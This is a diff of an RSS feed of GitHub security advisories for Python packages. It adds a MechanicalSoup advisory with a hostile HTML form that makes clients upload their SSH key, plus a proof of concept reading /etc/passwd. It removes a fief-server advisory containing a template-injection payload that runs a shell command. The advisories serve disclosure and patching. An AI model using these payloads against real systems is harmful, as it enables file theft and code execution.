@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2023-07-05T21:01:52.318Z</updated>
+    <updated>2023-07-05T22:01:36.901Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,251 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[MechanicalSoup] MechanicalSoup vulnerable to malicious web server reading arbitrary files on client using file input inside HTML form]]></title>
+        <id>https://github.com/advisories/GHSA-x456-3ccm-m6j4</id>
+        <link href="https://github.com/advisories/GHSA-x456-3ccm-m6j4"/>
+        <updated>2023-07-05T21:35:55.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A malicious web server can read arbitrary files on the client using a <code>&lt;input type="file" ...&gt;</code> inside HTML form.</p>
+<h3 id="details">Details</h3>
+<p>This affects the extremely common pattern of form submission:</p>
+<pre><code class="language-python">b = mechanicalsoup.StatefulBrowser()
+b.select_form(...)
+b.submit_selected()
+</code></pre>
+<p>The problem is with the code in <code>browser.Browser.get_request_kwargs</code>:</p>
+<pre><code class="language-python">    if tag.get("type", "").lower() == "file" and multipart:
+        filepath = value
+        if filepath != "" and isinstance(filepath, str):
+            content = open(filepath, "rb")
+        else:
+            content = ""
+        filename = os.path.basename(filepath)
+        # If value is the empty string, we still pass it
+        # for consistency with browsers (see
+        # https://github.com/MechanicalSoup/MechanicalSoup/issues/250).
+        files[name] = (filename, content)
+</code></pre>
+<p>The file path is taken from the bs4 tag "value" attribute. However, this path will default to whatever the server sends. So if a malicious web server were to send something like:</p>
+<pre><code class="language-html">&lt;html&gt;&lt;body&gt;
+  &lt;form method="post" enctype="multipart/form-data"&gt;
+    &lt;input type="text" name="greeting" value="hello" /&gt;
+    &lt;input type="file" name="evil" value="/home/user/.ssh/id_rsa" /&gt;
+  &lt;/form&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre>
+<p>then upon <code>.submit_selected()</code> the mechanicalsoup browser will happily send over the contents of your SSH private key.</p>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-python">import attr
+import mechanicalsoup
+import requests
+
+
+class NevermindError(Exception):
+    pass
+
+
+@attr.s
+class FakeSession:
+    session = attr.ib()
+
+    headers = property(lambda self: self.session.headers)
+
+    def request(self, *args, **kwargs):
+        print("requested", args, kwargs)
+        raise NevermindError  # don't actually send request
+
+
+def demonstrate(inputs=None):
+    b = mechanicalsoup.StatefulBrowser(FakeSession(requests.Session()))
+    b.open_fake_page("""\
+&lt;html&gt;&lt;body&gt;
+&lt;form method="post" enctype="multipart/form-data"&gt;
+&lt;input type="text" name="greeting" value="hello" /&gt;
+&lt;input type="file" name="evil" value="/etc/passwd" /&gt;
+&lt;input type="file" name="second" /&gt;
+&lt;/form&gt;
+&lt;/body&gt;&lt;/html&gt;
+""", url="http://127.0.0.1:9/")
+    b.select_form()
+    if inputs is not None:
+        b.form.set_input(inputs)
+    try:
+        b.submit_selected()
+    except NevermindError:
+        pass
+
+# %%
+
+# unpatched
+demonstrate()
+# OUTPUT: requested () {'method': 'post', 'url': 'http://127.0.0.1:9/', 'files': {'evil': ('passwd', &lt;_io.BufferedReader name='/etc/passwd'&gt;), 'second': ('', '')}, 'headers': {'Referer': 'http://127.0.0.1:9/'}, 'data': [('greeting', 'hello')]}
+
+# %%
+
+# with the patch, this now works. users MUST open the file manually and
+# use browser.set_input() using the file object.
+demonstrate({"greeting": "hiya", "evil": open("/etc/hostname", "rb").name, "second": open("/dev/null", "rb")})
+# OUTPUT: requested () {'method': 'post', 'url': 'http://127.0.0.1:9/', 'files': {'evil': ('hostname', &lt;_io.BufferedReader name='/etc/hostname'&gt;), 'second': ('null', &lt;_io.BufferedReader name='/dev/null'&gt;)}, 'headers': {'Referer': 'http://127.0.0.1:9/'}, 'data': [('greeting', 'hiya')]}
+
+# %%
+
+# with the patch, this raises a ValueError with a helpful string
+demonstrate({"evil": "/etc/hostname"})
+
+# %%
+
+# with the patch, we silently send no file if a malicious server tries the attack:
+demonstrate()
+</code></pre>
+<h3 id="suggested-patch">Suggested patch</h3>
+<pre><code class="language-diff">diff --git a/mechanicalsoup/browser.py b/mechanicalsoup/browser.py
+index 285f8bb..68bc65e 100644
+--- a/mechanicalsoup/browser.py
++++ b/mechanicalsoup/browser.py
+@@ -1,7 +1,8 @@
++import io
+ import os
+ import tempfile
+ import urllib
+ import weakref
+ import webbrowser
+ 
+ import bs4
+@@ -227,15 +228,21 @@ class Browser:
+                     value = tag.get("value", "")
+ 
+                 # If the enctype is not multipart, the filename is put in
+                 # the form as a text input and the file is not sent.
+                 if tag.get("type", "").lower() == "file" and multipart:
+                     filepath = value
+                     if filepath != "" and isinstance(filepath, str):
+-                        content = open(filepath, "rb")
++                        content = getattr(tag, "_mechanicalsoup_file", None)
++                        if content is False:
++                            raise ValueError(
++                                """From v1.3.0 onwards, you must pass an open file object directly, for example using `form.set_input({"name": open("/path/to/filename", "rb")})`. This change is to mitigate a security vulnerability where a malicious web server could read arbitrary files from the client."""
++                            )
++                        elif not isinstance(content, io.IOBase):
++                            content = ""
+                     else:
+                         content = ""
+                     filename = os.path.basename(filepath)
+                     # If value is the empty string, we still pass it
+                     # for consistency with browsers (see
+                     # https://github.com/MechanicalSoup/MechanicalSoup/issues/250).
+                     files[name] = (filename, content)
+diff --git a/mechanicalsoup/form.py b/mechanicalsoup/form.py
+index a67195c..82f6015 100644
+--- a/mechanicalsoup/form.py
++++ b/mechanicalsoup/form.py
+@@ -1,8 +1,9 @@
+ import copy
++import io
+ import warnings
+ 
+ from bs4 import BeautifulSoup
+ 
+ from .utils import LinkNotFoundError
+ 
+ 
+@@ -64,15 +65,24 @@ class Form:
+         give it the value ``password``.
+         """
+ 
+         for (name, value) in data.items():
+             i = self.form.find("input", {"name": name})
+             if not i:
+                 raise InvalidFormMethod("No input field named " + name)
+-            i["value"] = value
++
++            if isinstance(value, io.IOBase):
++                # Store the actual file object for &lt;input type="file"&gt;
++                i._mechanicalsoup_file = value
++                i["value"] = value.name
++            else:
++                # We set `_mechanicalsoup_file` to `False` so that we can
++                # check for deprecated use of the API.
++                i._mechanicalsoup_file = False
++                i["value"] = value
+ 
+     def uncheck_all(self, name):
+         """Remove the *checked*-attribute of all input elements with
+         a *name*-attribute given by ``name``.
+         """
+         for option in self.form.find_all("input", {"name": name}):
+             if "checked" in option.attrs:
+@@ -257,20 +267,20 @@ class Form:
+         .. code-block:: python
+ 
+             form.set("login", username)
+             form.set("password", password)
+             form.set("eula-checkbox", True)
+ 
+         Example: uploading a file through a ``&lt;input type="file"
+-        name="tagname"&gt;`` field (provide the path to the local file,
++        name="tagname"&gt;`` field (provide an open file object,
+         and its content will be uploaded):
+ 
+         .. code-block:: python
+ 
+-            form.set("tagname", path_to_local_file)
++            form.set("tagname", open(path_to_local_file, "rb"))
+ 
+         """
+         for func in ("checkbox", "radio", "input", "textarea", "select"):
+             try:
+                 getattr(self, "set_" + func)({name: value})
+                 return
+             except InvalidFormMethod:
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>All users of MechanicalSoup's form submission are affected, unless they took very specific (and manual) steps to reset HTML form field values.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/MechanicalSoup/MechanicalSoup/security/advisories/GHSA-x456-3ccm-m6j4">https://github.com/MechanicalSoup/MechanicalSoup/security/advisories/GHSA-x456-3ccm-m6j4</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-34457">https://nvd.nist.gov/vuln/detail/CVE-2023-34457</a></li>
+<li><a href="https://github.com/MechanicalSoup/MechanicalSoup/commit/d57c4a269bba3b9a0c5bfa20292955b849006d9e">https://github.com/MechanicalSoup/MechanicalSoup/commit/d57c4a269bba3b9a0c5bfa20292955b849006d9e</a></li>
+<li><a href="https://github.com/MechanicalSoup/MechanicalSoup/releases/tag/v1.3.0">https://github.com/MechanicalSoup/MechanicalSoup/releases/tag/v1.3.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-x456-3ccm-m6j4">https://github.com/advisories/GHSA-x456-3ccm-m6j4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-x456-3ccm-m6j4</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2023-07-05T21:35:54.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[petl] XML Injection in petl]]></title>
+        <id>https://github.com/advisories/GHSA-69q2-p9xp-739v</id>
+        <link href="https://github.com/advisories/GHSA-69q2-p9xp-739v"/>
+        <updated>2023-07-05T21:07:37.000Z</updated>
+        <content type="html"><![CDATA[<p>petl before 1.68, in some configurations, allows resolution of entities in an XML document.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/petl-developers/petl/security/advisories/GHSA-f5gc-p5m3-v347">https://github.com/petl-developers/petl/security/advisories/GHSA-f5gc-p5m3-v347</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-29128">https://nvd.nist.gov/vuln/detail/CVE-2020-29128</a></li>
+<li><a href="https://github.com/petl-developers/petl/issues/526">https://github.com/petl-developers/petl/issues/526</a></li>
+<li><a href="https://github.com/petl-developers/petl/pull/527">https://github.com/petl-developers/petl/pull/527</a></li>
+<li><a href="https://github.com/petl-developers/petl/pull/527/commits/1b0a09f08c3cdfe2e69647bd02f97c1367a5b5f8">https://github.com/petl-developers/petl/pull/527/commits/1b0a09f08c3cdfe2e69647bd02f97c1367a5b5f8</a></li>
+<li><a href="https://github.com/nvn1729/advisories/blob/master/cve-2020-29128.md">https://github.com/nvn1729/advisories/blob/master/cve-2020-29128.md</a></li>
+<li><a href="https://github.com/petl-developers/petl/compare/v1.6.7...v1.6.8">https://github.com/petl-developers/petl/compare/v1.6.7...v1.6.8</a></li>
+<li><a href="https://petl.readthedocs.io/en/stable/changes.html">https://petl.readthedocs.io/en/stable/changes.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-69q2-p9xp-739v">https://github.com/advisories/GHSA-69q2-p9xp-739v</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-69q2-p9xp-739v</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2021-04-20T16:32:08.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[grpcio] Connection confusion in gRPC]]></title>
         <id>https://github.com/advisories/GHSA-cfgp-2977-2fmm</id>
@@ -636,71 +881,5 @@ echo -e "e\rvvvvvvvv = zzzzzzzz\n" | python3 poc.py
         </author>
         <category label="severity" term="HIGH"/>
         <published>2023-06-23T21:44:35.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[fief-server] fief-server Server-Side Template Injection vulnerability]]></title>
-        <id>https://github.com/advisories/GHSA-hj8m-9fhf-v7jp</id>
-        <link href="https://github.com/advisories/GHSA-hj8m-9fhf-v7jp"/>
-        <updated>2023-06-27T23:07:54.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="server-side-template-injection">Server-Side Template Injection</h1>
-<h2 id="overview-of-the-vulnerability">Overview of the Vulnerability</h2>
-<p>Server-Side Template Injection (SSTI) is a vulnerability within application templating engines where user input is improperly handled and is embedded into the template, possibly leading code being executed.</p>
-<p>An attacker can use SSTI to execute code on the underlying system by manipulating values within the embedded template. When code is executed within the underlying system, it can allow an attacker to run permissioned commands under the exploited process, or exploit Cross-Site Scripting (XSS) to run code within the user's browser.</p>
-<h2 id="business-impact">Business Impact</h2>
-<p>SSTI can lead to reputational damage for the business due to a loss in confidence and trust by users. If an attacker successfully executes code within the underlying system, it can result in data theft and indirect financial losses.</p>
-<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
-<ol>
-<li><a href="https://fief.fief.dev/register">Sign up</a> and login to your account</li>
-<li>Use a browser to navigate to: email-templates {{<a href="https://test.fief.dev/admin/customization/email-templates/">URL</a>}}</li>
-<li>put your payload in Edit Base template <code>{{ cycler.__init__.__globals__.os.popen('id').read() }}</code> and you will se it will execute.</li>
-</ol>
-<p>Payload:
-<code>{{ cycler.__init__.__globals__.os.popen('id').read() }}</code></p>
-<h2 id="proof-of-concept-poc">Proof of Concept (PoC)</h2>
-<p>The screenshot(s) below demonstrates the SSTI:</p>
-<p><img alt="SSTI" src="https://user-images.githubusercontent.com/42150485/248214990-854c2272-4f34-4c49-9759-d49ce8ce3d12.png"></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/fief-dev/fief/security/advisories/GHSA-hj8m-9fhf-v7jp">https://github.com/fief-dev/fief/security/advisories/GHSA-hj8m-9fhf-v7jp</a></li>
-<li><a href="https://github.com/fief-dev/fief/commit/91e56625b641fa419e2985772266774bae18382b">https://github.com/fief-dev/fief/commit/91e56625b641fa419e2985772266774bae18382b</a></li>
-<li><a href="https://github.com/fief-dev/fief/releases/tag/v0.25.3">https://github.com/fief-dev/fief/releases/tag/v0.25.3</a></li>
-<li><a href="https://github.com/advisories/GHSA-hj8m-9fhf-v7jp">https://github.com/advisories/GHSA-hj8m-9fhf-v7jp</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-hj8m-9fhf-v7jp</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2023-06-23T21:46:11.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[Flask-AppBuilder] Flask-AppBuilder vulnerable to possible disclosure of sensitive information on user error]]></title>
-        <id>https://github.com/advisories/GHSA-jhpr-j7cq-3jp3</id>
-        <link href="https://github.com/advisories/GHSA-jhpr-j7cq-3jp3"/>
-        <updated>2023-07-03T21:35:45.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>An authenticated malicious actor with Admin privileges, could by adding a special character on the add, edit User forms trigger a database error, this error is surfaced back to this actor on the UI. On certain database engines this error can include the entire user row including the pbkdf2:sha256 hashed password.</p>
-<h3 id="patches">Patches</h3>
-<p>Fixed on 4.3.2</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/dpgaspar/Flask-AppBuilder/security/advisories/GHSA-jhpr-j7cq-3jp3">https://github.com/dpgaspar/Flask-AppBuilder/security/advisories/GHSA-jhpr-j7cq-3jp3</a></li>
-<li><a href="https://github.com/dpgaspar/Flask-AppBuilder/pull/2045">https://github.com/dpgaspar/Flask-AppBuilder/pull/2045</a></li>
-<li><a href="https://github.com/dpgaspar/Flask-AppBuilder/commit/ae25ad4c87a9051ebe4a4e8f02aee73232642626">https://github.com/dpgaspar/Flask-AppBuilder/commit/ae25ad4c87a9051ebe4a4e8f02aee73232642626</a></li>
-<li><a href="https://github.com/dpgaspar/Flask-AppBuilder/releases/tag/v4.3.2">https://github.com/dpgaspar/Flask-AppBuilder/releases/tag/v4.3.2</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-34110">https://nvd.nist.gov/vuln/detail/CVE-2023-34110</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/flask-appbuilder/PYSEC-2023-94.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/flask-appbuilder/PYSEC-2023-94.yaml</a></li>
-<li><a href="https://github.com/advisories/GHSA-jhpr-j7cq-3jp3">https://github.com/advisories/GHSA-jhpr-j7cq-3jp3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jhpr-j7cq-3jp3</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2023-06-22T19:59:03.000Z</published>
     </entry>
 </feed>
